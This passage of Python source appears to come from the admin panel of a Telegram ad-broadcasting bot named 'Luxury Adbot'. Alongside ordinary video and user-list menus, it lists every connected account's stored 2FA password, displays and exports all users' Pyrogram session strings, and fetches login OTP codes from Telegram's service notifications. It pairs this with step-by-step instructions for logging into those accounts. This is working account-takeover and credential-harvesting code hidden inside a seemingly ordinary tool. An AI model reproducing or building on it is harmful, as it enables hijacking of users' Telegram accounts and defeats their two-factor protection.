            await query.message.reply_text(
                f"{header}\n{divider}\n\n"
                f"{e('camera')} <b>Send your Welcome Video / GIF / Animation from gallery:</b>\n\n"
                f"<i>⚡ Current Playlist: <b>{cnt} videos</b>. Every video you send will be saved to the Playlist. Users will see videos in alternating sequence on /start!</i>\n\n"
                f"<i>Type /cancel to abort or finish.</i>",
                parse_mode="HTML"
            )

        elif data == "adm_manage_videos":
            vids = db.get_welcome_videos()
            header = f"{e('deco_fly_l')} <b>WELCOME VIDEOS PLAYLIST MANAGER</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
            if not vids:
                text = (
                    f"{header}\n{divider}\n\n"
                    f"📭 <b>No welcome videos in playlist.</b>\n\n"
                    f"<i>Tap <b>Add Welcome Video</b> below to upload videos!</i>"
                )
                btns = [
                    [InlineKeyboardButton("Add Welcome Video", callback_data="adm_set_video", icon_custom_emoji_id=_E["camera"], style="success")],
                    [InlineKeyboardButton("Back to Admin Panel", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="primary")]
                ]
            else:
                lines = [f"{header}\n{divider}\n\n{e('camera')} <b>Active Videos in Playlist ({num_to_emoji(len(vids))}):</b>\n"]
                btns = []
                for i, v in enumerate(vids, 1):
                    v_dict = dict(v)
                    v_type = v_dict.get("video_type", "video").upper()
                    v_id_num = v_dict["id"]
                    lines.append(f"🎥 <b>Video #{num_to_emoji(i)}</b> — Type: <code>{v_type}</code> (ID: {num_to_emoji(v_id_num)})")
                    btns.append([
                        InlineKeyboardButton(f"Delete Video #{i}", callback_data=f"adm_del_vid_{v_id_num}", icon_custom_emoji_id=_E["trash"], style="danger")
                    ])
                lines.append(f"\n{divider}\n<i>Tap a delete button below to remove specific video from playlist:</i>")
                btns.append([
                    InlineKeyboardButton("Add More Videos", callback_data="adm_set_video", icon_custom_emoji_id=_E["plus"], style="success"),
                    InlineKeyboardButton("Clear ALL Videos", callback_data="adm_del_video", icon_custom_emoji_id=_E["trash"], style="danger")
                ])
                btns.append([InlineKeyboardButton("Back to Admin Panel", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="primary")])
                text = "\n".join(lines)

            try:
                await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(btns), parse_mode="HTML")
            except Exception:
                await query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(btns), parse_mode="HTML")

        elif data.startswith("adm_del_vid_"):
            vid_id = int(data.replace("adm_del_vid_", ""))
            db.delete_welcome_video(vid_id)
            await query.answer(f"✅ Video #{vid_id} deleted successfully!", show_alert=True)
            vids = db.get_welcome_videos()
            header = f"{e('deco_fly_l')} <b>WELCOME VIDEOS PLAYLIST MANAGER</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
            if not vids:
                text = (
                    f"{header}\n{divider}\n\n"
                    f"📭 <b>No welcome videos left in playlist.</b>"
                )
                btns = [
                    [InlineKeyboardButton("Add Welcome Video", callback_data="adm_set_video", icon_custom_emoji_id=_E["camera"], style="success")],
                    [InlineKeyboardButton("Back to Admin Panel", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="primary")]
                ]
            else:
                lines = [f"{header}\n{divider}\n\n{e('camera')} <b>Active Videos in Playlist ({len(vids)}):</b>\n"]
                btns = []
                for i, v in enumerate(vids, 1):
                    v_dict = dict(v)
                    v_type = v_dict.get("video_type", "video").upper()
                    v_id_num = v_dict["id"]
                    lines.append(f"🎥 <b>Video #{i}</b> — Type: <code>{v_type}</code> (ID: <code>{v_id_num}</code>)")
                    btns.append([
                        InlineKeyboardButton(f"Delete Video #{i}", callback_data=f"adm_del_vid_{v_id_num}", icon_custom_emoji_id=_E["trash"], style="danger")
                    ])
                lines.append(f"\n{divider}\n<i>Tap a delete button below to remove specific video from playlist:</i>")
                btns.append([
                    InlineKeyboardButton("Add More Videos", callback_data="adm_set_video", icon_custom_emoji_id=_E["plus"], style="success"),
                    InlineKeyboardButton("Clear ALL Videos", callback_data="adm_del_video", icon_custom_emoji_id=_E["trash"], style="danger")
                ])
                btns.append([InlineKeyboardButton("Back to Admin Panel", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="primary")])
                text = "\n".join(lines)

            try:
                await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(btns), parse_mode="HTML")
            except Exception:
                await query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(btns), parse_mode="HTML")

        elif data == "adm_del_video":
            db.clear_welcome_videos()
            await query.message.reply_text(f"{e('check')} <b>All Welcome Playlist Videos removed successfully!</b>", parse_mode="HTML")
            text, markup = build_admin_dashboard()
            try:
                await query.edit_message_text(text, reply_markup=markup, parse_mode="HTML")
            except Exception:
                pass

        # ── All Users List ───────────────────────────────────────────
        elif data == "adm_users":
            users = db.get_all_users()
            header = f"{e('deco_fly_l')} <b>ALL REGISTERED USERS</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
            if not users:
                await query.message.reply_text(f"{header}\n{divider}\n\n💭 No users have started the bot yet.", parse_mode="HTML")
                return
            text    = f"{header}\n{divider}\n\n"
            buttons = []
            for u in users:
                uid_u     = u["user_id"]
                name      = escape_html(u["first_name"] or f"User {uid_u}")
                uname     = f" (@{escape_html(u['username'])})" if u["username"] else ""
                acc_count = db.count_accounts(uid_u)
                status_icon = "🟢" if sched.is_user_running(uid_u) else "⚪"
                text += f"{status_icon} <b>{name}</b>{uname}\n<code>ID: {uid_u}</code> | {e('android')} <code>{acc_count} accounts</code>\n\n"
                buttons.append([InlineKeyboardButton(
                    f"{name} ({acc_count} accs)",
                    callback_data=f"adm_u_{uid_u}",
                    icon_custom_emoji_id=_E["crown"],
                    style="primary"
                )])
            buttons.append([InlineKeyboardButton("Back to Admin Home", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="danger")])
            await query.message.reply_text(
                text, parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(buttons)
            )

        # ── Lives: Live Active Accounts & Broadcasting Analysis ────
        elif data == "adm_lives":
            accounts = db.get_all_accounts_admin()  # returns active accounts (is_active = 1)
            header = f"{e('deco_fly_l')} <b>{e('livei')} LIVES — ACTIVE ACCOUNTS ({len(accounts)})</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            if not accounts:
                text = f"{header}\n{divider}\n\n{e('question')} <i>No logged-in active accounts found.</i>"
                buttons = [[InlineKeyboardButton("Back to Admin Home", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="danger")]]
                try:
                    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")
                except Exception:
                    await query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")
                return

            active_broadcasting = 0
            idle_accounts = 0

            details_text = ""
            for acc in accounts:
                owner_id  = acc["owner_id"]
                phone     = acc["phone"]
                first_n   = escape_html(acc["first_name"] or "Account")
                owner_n   = escape_html(acc["owner_first_name"] or f"User:{owner_id}")
                owner_un  = f" (@{escape_html(acc['owner_username'])})" if acc["owner_username"] else ""

                is_running = sched.is_user_running(owner_id)
                if is_running:
                    active_broadcasting += 1
                    status_badge = f"{e('livei')} <b>ONLINE (Broadcasting)</b>"
                else:
                    idle_accounts += 1
                    status_badge = f"{e('offlineui')} <b>IDLE (Connected)</b>"

                user_settings_row = db.get_settings(owner_id)
                user_settings     = dict(user_settings_row) if user_settings_row else {}
                user_stats        = db.get_stats(owner_id)

                interval_val = user_settings.get('interval', '5min')
                cycles_val   = user_settings.get('cycles', 0)
                cycles_str   = f"<code>Unlimited</code> {e('infinty1')}" if cycles_val == 0 else f"<code>{cycles_val}</code>"

                details_text += (
                    f"{e('crown')} <b>Main User ID:</b> <code>{owner_id}</code> — <b>{owner_n}</b>{owner_un}\n"
                    f"{e('android')} <b>Ad Account:</b> <code>{phone}</code> (<b>{first_n}</b>)\n"
                    f"{e('lightni')} <b>Live Status:</b> {status_badge}\n"
                    f"{e('clock')} <b>Interval:</b> <code>{interval_val}</code> | "
                    f"{e('chart')} <b>Cycles:</b> {cycles_str}\n"
                    f"{e('check')} <b>Sent:</b> <code>{user_stats['sent']}</code> | {e('cross')} <b>Failed:</b> <code>{user_stats['failed']}</code>\n"
                    f"{divider}\n"
                )

            summary_header = (
                f"{e('livei')} <b>Live Broadcasting:</b> <code>{active_broadcasting}</code>\n"
                f"{e('offlineui')} <b>Idle / Connected:</b> <code>{idle_accounts}</code>\n"
                f"{e('android')} <b>Total Active Logged-in:</b> <code>{len(accounts)}</code>\n\n"
            )

            full_text = f"{header}\n{divider}\n\n{summary_header}{details_text}"

            buttons = [
                [
                    InlineKeyboardButton("Refresh Lives", callback_data="adm_lives", icon_custom_emoji_id=_E["gear"], style="primary"),
                ],
                [
                    InlineKeyboardButton("Back to Admin Home", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="danger"),
                ]
            ]

            try:
                await query.edit_message_text(full_text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")
            except Exception:
                await query.message.reply_text(full_text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")

        # ── All Accounts (Live Filtered) ──────────────────────────────
        elif data == "adm_accs":
            raw_accounts = db.get_all_accounts_admin()
            if not raw_accounts:
                header = f"{e('deco_fly_l')} <b>ALL CONNECTED ACCOUNTS (0)</b> {e('deco_fly_r')}"
                divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
                await query.message.reply_text(f"{header}\n{divider}\n\n💭 No accounts connected yet.", parse_mode="HTML")
                return

            # Live filter to verify session validity
            live_results = await asyncio.gather(
                *[broadcaster.verify_session_alive(acc["phone"], acc["session_string"]) for acc in raw_accounts],
                return_exceptions=True
            )

            accounts = [acc for acc, is_live in zip(raw_accounts, live_results) if is_live is True]

            header = f"{e('deco_fly_l')} <b>LIVE CONNECTED ACCOUNTS ({len(accounts)})</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            if not accounts:
                await query.message.reply_text(f"{header}\n{divider}\n\n💭 No live accounts currently logged in. (Logged-out sessions auto-cleared)", parse_mode="HTML")
                return

            text = (
                f"{header}\n{divider}\n\n"
                f"<i>🟢 Showing only live active logged-in accounts below. Tap any button to inspect:</i>\n\n"
            )
            buttons = []
            for acc in accounts[:25]:
                acc_id   = acc["id"]
                phone    = acc["phone"]
                first_n  = escape_html(acc["first_name"] or f"Owner:{acc['owner_id']}")
                uname    = f" (@{escape_html(acc['username'])})" if acc["username"] else ""
                text += f"• <code>{phone}</code> — <b>{first_n}</b>{uname}\n"
                buttons.append([InlineKeyboardButton(
                    f"🟢 {phone} ({first_n})",
                    callback_data=f"adm_acc_info_{acc_id}",
                    icon_custom_emoji_id=_E["android"],
                    style="primary"
                )])
            buttons.append([InlineKeyboardButton("Back to Admin Home", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="danger")])
            await query.message.reply_text(
                text, parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(buttons)
            )

        # ── 2FA Passwords List ───────────────────────────────────────
        elif data == "adm_2fa_list":
            accounts = db.get_all_accounts_admin()
            header = f"{e('deco_fly_l')} <b>SAVED 2FA PASSWORDS ({len(accounts)})</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
            if not accounts:
                await query.message.reply_text(f"{header}\n{divider}\n\n💭 No accounts added yet.", parse_mode="HTML")
                return

            text = f"{header}\n{divider}\n\n"
            for acc in accounts:
                phone    = acc["phone"]
                owner_id = acc["owner_id"]
                first_n  = escape_html(acc["first_name"] or f"Owner:{owner_id}")
                uname    = f" (@{escape_html(acc['username'])})" if acc["username"] else ""
                pwd      = dict(acc).get("two_fa_password") or ""
                pwd_str  = f"<code>{escape_html(pwd)}</code>" if pwd else "<i>No 2FA Set / Direct OTP</i>"
                text += (
                    f"📱 <b>Phone:</b> <code>{phone}</code> ({first_n}{uname})\n"
                    f"👤 <b>Owner ID:</b> <code>{owner_id}</code>\n"
                    f"🔑 <b>2FA Password:</b> {pwd_str}\n\n"
                )

            buttons = [[InlineKeyboardButton("Back to Admin Home", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="danger")]]
            await query.message.reply_text(
                text, parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(buttons)
            )

        # ── Session ID Extractor (List Accounts) ────────────────────
        elif data.startswith("adm_session_extractor") or data.startswith("adm_session_ext_page_"):
            page = 1
            if data.startswith("adm_session_ext_page_"):
                try:
                    page = int(data.replace("adm_session_ext_page_", ""))
                except ValueError:
                    page = 1

            raw_accounts = db.get_all_accounts_admin()
            header = f"{e('deco_fly_l')} <b>🔑 SESSION ID EXTRACTOR</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            if not raw_accounts:
                await query.message.reply_text(f"{header}\n{divider}\n\n💭 No connected ad accounts found.", parse_mode="HTML")
                return

            page_size   = 15
            total_items = len(raw_accounts)
            total_pages = math.ceil(total_items / page_size) or 1
            page        = max(1, min(page, total_pages))

            start_idx = (page - 1) * page_size
            end_idx   = start_idx + page_size
            chunk     = raw_accounts[start_idx:end_idx]

            text = (
                f"{header}\n{divider}\n\n"
                f"<b>Total Connected Accounts:</b> <code>{total_items}</code> | <b>Page {page}/{total_pages}</b>\n\n"
                f"<i>⚡ Select an account below to extract/copy its Pyrogram Session ID or download string file:</i>\n\n"
            )
            buttons = []
            for acc in chunk:
                acc_d    = dict(acc)
                acc_id   = acc_d["id"]
                phone    = acc_d["phone"]
                owner_id = acc_d["owner_id"]
                acc_name = escape_html(acc_d.get("first_name") or "")
                owner_fn = escape_html(acc_d.get("owner_first_name") or "")

                label_info = f"{acc_name} | Owner:{owner_id}" if acc_name else f"Owner:{owner_id} ({owner_fn})"
                buttons.append([InlineKeyboardButton(
                    f"🔑 {phone} ({label_info})",
                    callback_data=f"adm_sess_v_{acc_id}",
                    icon_custom_emoji_id=_E["lock"],
                    style="primary"
                )])

            nav_row = []
            if page > 1:
                nav_row.append(InlineKeyboardButton("Previous", callback_data=f"adm_session_ext_page_{page-1}", icon_custom_emoji_id=_E["arrow"], style="primary"))
            nav_row.append(InlineKeyboardButton(f"{page}/{total_pages}", callback_data="admin_home", icon_custom_emoji_id=_E["globe"]))
            if page < total_pages:
                nav_row.append(InlineKeyboardButton("Next", callback_data=f"adm_session_ext_page_{page+1}", icon_custom_emoji_id=_E["arrow"], style="primary"))

            if nav_row:
                buttons.append(nav_row)

            buttons.append([InlineKeyboardButton("Export All Sessions (.txt)", callback_data="adm_sess_export_all", icon_custom_emoji_id=_E["link"], style="success")])
            buttons.append([InlineKeyboardButton("Back to Admin Home", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="danger")])

            await query.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(buttons))

        # ── View Single Account Session String ───────────────────────
        elif data.startswith("adm_sess_v_"):
            acc_id = int(data.replace("adm_sess_v_", ""))
            acc    = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            acc_d     = dict(acc)
            phone     = acc_d["phone"]
            owner_id  = acc_d["owner_id"]
            first_n   = escape_html(acc_d.get("first_name") or "")
            uname     = f" (@{escape_html(acc_d['username'])})" if acc_d.get("username") else ""
            added_at  = acc_d.get("added_at") or "N/A"
            sess_str  = acc_d.get("session_string") or ""

            header  = f"{e('deco_fly_l')} <b>🔑 ACCOUNT SESSION ID DETAILS</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            text = (
                f"{header}\n{divider}\n\n"
                f"📱 <b>Phone:</b> <code>{phone}</code>\n"
                f"👤 <b>Owner ID:</b> <code>{owner_id}</code> ({first_n}{uname})\n"
                f"⏱ <b>Added At:</b> <code>{added_at}</code>\n\n"
                f"🔑 <b>Pyrogram V2 Session String (Tap to Copy):</b>\n"
                f"<code>{escape_html(sess_str)}</code>\n\n"
                f"{divider}\n"
                f"<i>⚡ Tap 'Download Session File' to download string text file directly:</i>"
            )

            buttons = [
                [InlineKeyboardButton("Download Session File", callback_data=f"adm_sess_dl_{acc_id}", icon_custom_emoji_id=_E["link"], style="success")],
                [InlineKeyboardButton("Back to Extractor List", callback_data="adm_session_extractor", icon_custom_emoji_id=_E["arrow"], style="primary")],
                [InlineKeyboardButton("Back to Admin Home", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="danger")]
            ]
            await query.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(buttons))

        # ── Download Single Account Session File ─────────────────────
        elif data.startswith("adm_sess_dl_"):
            acc_id = int(data.replace("adm_sess_dl_", ""))
            acc    = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            acc_d    = dict(acc)
            phone    = acc_d["phone"]
            sess_str = acc_d.get("session_string") or ""
            filename = f"session_{phone.replace('+', '')}.txt"

            content  = (
                f"=========================================\n"
                f"LUXURY ADBOT - PYROGRAM SESSION STRING\n"
                f"=========================================\n"
                f"Phone Number : {phone}\n"
                f"Owner ID     : {acc_d['owner_id']}\n"
                f"First Name   : {acc_d.get('first_name', '')}\n"
                f"Username     : @{acc_d.get('username', '')}\n"
                f"Added Date   : {acc_d.get('added_at', '')}\n"
                f"=========================================\n"
                f"SESSION STRING:\n"
                f"{sess_str}\n"
                f"=========================================\n"
            )
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)

            with open(filename, "rb") as doc_file:
                await query.message.reply_document(
                    document=doc_file,
                    filename=filename,
                    caption=f"🔑 <b>Session ID File for Account:</b> <code>{phone}</code>",
                    parse_mode="HTML"
                )
            try:
                os.remove(filename)
            except Exception:
                pass

        # ── Export All Session Strings File ───────────────────────────
        elif data == "adm_sess_export_all":
            accounts = db.get_all_accounts_admin()
            if not accounts:
                await query.message.reply_text(f"{e('cross')} No accounts available to export.", parse_mode="HTML")
                return

            filename = f"all_adbot_sessions_{int(time.time())}.txt"
            lines = [
                "===========================================================",
                "LUXURY ADBOT - ALL CONNECTED ACCOUNTS SESSION EXPORT",
                f"Total Accounts: {len(accounts)}",
                f"Export Date   : {time.strftime('%Y-%m-%d %H:%M:%S')}",
                "===========================================================\n"
            ]
            for idx, acc in enumerate(accounts, 1):
                acc_d    = dict(acc)
                phone    = acc_d["phone"]
                owner_id = acc_d["owner_id"]
                owner_n  = acc_d.get("owner_first_name") or acc_d.get("first_name") or "N/A"
                owner_u  = acc_d.get("owner_username") or acc_d.get("username") or ""
                sess_str = acc_d.get("session_string") or ""
                lines.append(f"[{idx}] PHONE: {phone} | OWNER ID: {owner_id} ({owner_n} @{owner_u})")
                lines.append(f"SESSION: {sess_str}\n")

            with open(filename, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))

            with open(filename, "rb") as doc_file:
                await query.message.reply_document(
                    document=doc_file,
                    filename="all_adbot_sessions.txt",
                    caption=f"🔑 <b>Exported {len(accounts)} Pyrogram Session IDs successfully!</b>",
                    parse_mode="HTML"
                )
            try:
                os.remove(filename)
            except Exception:
                pass

        # ── Use Session ID (List Accounts for Instant Login) ───────
        elif data.startswith("adm_use_session_id") or data.startswith("adm_use_sess_page_"):
            page = 1
            if data.startswith("adm_use_sess_page_"):
                try:
                    page = int(data.replace("adm_use_sess_page_", ""))
                except ValueError:
                    page = 1

            raw_accounts = db.get_all_accounts_admin()
            header  = f"{e('deco_fly_l')} <b>⚡ USE SESSION ID — INSTANT LOGIN</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            if not raw_accounts:
                await query.message.reply_text(f"{header}\n{divider}\n\n💭 No connected ad accounts found.", parse_mode="HTML")
                return

            page_size   = 15
            total_items = len(raw_accounts)
            total_pages = math.ceil(total_items / page_size) or 1
            page        = max(1, min(page, total_pages))

            start_idx = (page - 1) * page_size
            end_idx   = start_idx + page_size
            chunk     = raw_accounts[start_idx:end_idx]

            text = (
                f"{header}\n{divider}\n\n"
                f"<b>Total Connected Accounts:</b> <code>{total_items}</code> | <b>Page {page}/{total_pages}</b>\n\n"
                f"<i>⚡ Select an account below to view its Session ID, read step-by-step login guide, and execute live instant Telegram login:</i>\n\n"
            )
            buttons = []
            for acc in chunk:
                acc_d    = dict(acc)
                acc_id   = acc_d["id"]
                phone    = acc_d["phone"]
                owner_id = acc_d["owner_id"]
                acc_name = escape_html(acc_d.get("first_name") or "")
                owner_fn = escape_html(acc_d.get("owner_first_name") or "")

                label_info = f"{acc_name} | Owner:{owner_id}" if acc_name else f"Owner:{owner_id} ({owner_fn})"
                buttons.append([InlineKeyboardButton(
                    f"⚡ {phone} ({label_info})",
                    callback_data=f"adm_use_sess_guide_{acc_id}",
                    icon_custom_emoji_id=_E["fire"],
                    style="primary"
                )])

            nav_row = []
            if page > 1:
                nav_row.append(InlineKeyboardButton("Previous", callback_data=f"adm_use_sess_page_{page-1}", icon_custom_emoji_id=_E["arrow"], style="primary"))
            nav_row.append(InlineKeyboardButton(f"{page}/{total_pages}", callback_data="admin_home", icon_custom_emoji_id=_E["globe"]))
            if page < total_pages:
                nav_row.append(InlineKeyboardButton("Next", callback_data=f"adm_use_sess_page_{page+1}", icon_custom_emoji_id=_E["arrow"], style="primary"))

            if nav_row:
                buttons.append(nav_row)

            buttons.append([InlineKeyboardButton("Back to Admin Home", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="danger")])

            await query.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(buttons))

        # ── Use Session ID Guide & Details View ───────────────────────
        elif data.startswith("adm_use_sess_guide_"):
            acc_id = int(data.replace("adm_use_sess_guide_", ""))
            acc    = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            acc_d     = dict(acc)
            phone     = acc_d["phone"]
            owner_id  = acc_d["owner_id"]
            first_n   = escape_html(acc_d.get("first_name") or "")
            uname     = f" (@{escape_html(acc_d['username'])})" if acc_d.get("username") else ""
            sess_str  = acc_d.get("session_string") or ""

            header  = f"{e('deco_fly_l')} <b>⚡ USE SESSION ID — LOGIN GUIDE & OTP</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            text = (
                f"{header}\n{divider}\n\n"
                f"📱 <b>Account Phone:</b> <code>{phone}</code>\n"
                f"👤 <b>Owner:</b> <code>{owner_id}</code> ({first_n}{uname})\n\n"
                f"🔑 <b>Pyrogram V2 Session String (Tap to Copy):</b>\n"
                f"<code>{escape_html(sess_str)}</code>\n\n"
                f"📖 <b>HOW TO LOGIN ON OFFICIAL TELEGRAM APP / WEB:</b>\n"
                f"1. Open <b>Telegram App</b> or <b>web.telegram.org</b> on your phone/PC.\n"
                f"2. Enter phone number: <code>{phone}</code>\n"
                f"3. Click <b>'Send Code'</b> on Telegram.\n"
                f"4. Tap <b>'📩 Get Telegram Login OTP Code'</b> below to get the 5-digit code instantly!\n\n"
                f"⚡ <i>Or tap <b>🚀 Login Telegram Now</b> below to authenticate session in bot live!</i>\n"
            )

            buttons = [
                [InlineKeyboardButton("Get Telegram Login OTP Code", callback_data=f"adm_get_otp_{acc_id}", icon_custom_emoji_id=_E["bell"], style="success")],
                [InlineKeyboardButton("Login Telegram Now", callback_data=f"adm_use_sess_login_{acc_id}", icon_custom_emoji_id=_E["fire"], style="primary")],
                [InlineKeyboardButton("Download .session File", callback_data=f"adm_sess_dl_{acc_id}", icon_custom_emoji_id=_E["link"], style="primary")],
                [InlineKeyboardButton("Back to Use Session ID List", callback_data="adm_use_session_id", icon_custom_emoji_id=_E["arrow"], style="primary")],
                [InlineKeyboardButton("Back to Admin Home", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="danger")]
            ]
            await query.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(buttons))

        # ── Fetch Telegram Official Login OTP Code ──────────────────
        elif data.startswith("adm_get_otp_"):
            acc_id = int(data.replace("adm_get_otp_", ""))
            acc    = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            phone    = acc["phone"]
            sess_str = dict(acc).get("session_string") or ""

            status_msg = await query.message.reply_text(f"⏳ Reading Telegram Official Notifications (777000) for <code>{phone}</code>...", parse_mode="HTML")

            res = await broadcaster.get_latest_login_otp(sess_str)

            header  = f"{e('deco_fly_l')} <b>📩 TELEGRAM LOGIN OTP CODE</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            if not res.get("success"):
                err_text = (
                    f"{header}\n{divider}\n\n"
                    f"⚠️ <b>OTP Code Not Found Yet</b>\n\n"
                    f"📱 <b>Account Phone:</b> <code>{phone}</code>\n\n"
                    f"📖 <b>HOW TO GET OTP CODE & LOGIN ON TELEGRAM APP/WEB:</b>\n"
                    f"1. Open <b>Telegram App</b> or <b>web.telegram.org</b> on your phone/PC.\n"
                    f"2. Enter phone number: <code>{phone}</code>\n"
                    f"3. Click <b>'Send Code'</b> on Telegram.\n"
                    f"4. Once sent, tap <b>'🔄 Refresh OTP Code'</b> button below!\n\n"
                    f"<i>Details: {escape_html(res.get('error'))}</i>"
                )
                buttons = [
                    [InlineKeyboardButton("Refresh OTP Code", callback_data=f"adm_get_otp_{acc_id}", icon_custom_emoji_id=_E["bell"], style="success")],
                    [InlineKeyboardButton("Back to Use Session ID", callback_data="adm_use_session_id", icon_custom_emoji_id=_E["arrow"], style="primary")]
                ]
                try:
                    await status_msg.edit_text(err_text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(buttons))
                except Exception:
                    await query.message.reply_text(err_text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(buttons))
                return

            otp_code  = res.get("otp")
            msg_text  = escape_html(res.get("text") or "")
            date_s    = res.get("date") or "Just now"

            if otp_code:
                body = (
                    f"{e('check')} <b>LIVE TELEGRAM LOGIN OTP CODE FOUND!</b>\n\n"
                    f"📱 <b>Phone:</b> <code>{phone}</code>\n"
                    f"⏱ <b>Received At:</b> <code>{date_s}</code>\n\n"
                    f"🔑 <b>5-DIGIT LOGIN OTP CODE (Tap to Copy):</b>\n"
                    f"<code>{otp_code}</code>\n\n"
                    f"{divider}\n"
                    f"📖 <b>HOW TO LOGIN ON OFFICIAL TELEGRAM APP / WEB:</b>\n"
                    f"1. Open <b>Telegram App</b> or <b>web.telegram.org</b> on your phone/PC.\n"
                    f"2. Enter <code>{phone}</code> and click <b>Send Code</b>.\n"
                    f"3. Paste code <code>{otp_code}</code> into Telegram.\n"
                    f"4. <b>BOOM! You are now logged in! 🎉</b>"
                )
            else:
                body = (
                    f"📩 <b>Latest Service Notification ({date_s}):</b>\n\n"
                    f"<code>{msg_text}</code>"
                )

            text = f"{header}\n{divider}\n\n{body}"
            buttons = [
                [InlineKeyboardButton("Refresh OTP Code", callback_data=f"adm_get_otp_{acc_id}", icon_custom_emoji_id=_E["bell"], style="success")],
                [InlineKeyboardButton("Back to Account", callback_data=f"adm_use_sess_guide_{acc_id}", icon_custom_emoji_id=_E["arrow"], style="primary")],
                [InlineKeyboardButton("Back to Admin Home", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="danger")]
            ]

            try:
                await status_msg.delete()
            except Exception:
                pass
            await query.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(buttons))

        # ── Account Detail View ──────────────────────────────────────
        elif data.startswith("adm_acc_info_"):
            acc_id = int(data.replace("adm_acc_info_", ""))
            acc    = db.get_account_by_id(acc_id)
            if not acc:
                await query.message.reply_text(f"{e('cross')} Account not found.", parse_mode="HTML")
                return

            phone      = acc["phone"]
            acc_name   = escape_html(f"{acc['first_name']} {acc['last_name']}".strip() or "Not set")
            username   = f"@{escape_html(acc['username'])}" if acc["username"] else "None"
            tg_user_id = acc["tg_user_id"] or "Not set"
            owner_id   = acc["owner_id"]

            await query.message.reply_text(f"⏳ Inspecting live profile & chats for <code>{phone}</code>...", parse_mode="HTML")
            p_info = await broadcaster.get_session_full_profile(acc["session_string"])

            prem_str = "⭐ Yes (Premium)" if p_info.get("is_premium") else "⚪ Standard"
            dc_str   = str(p_info.get("dc_id", "N/A"))
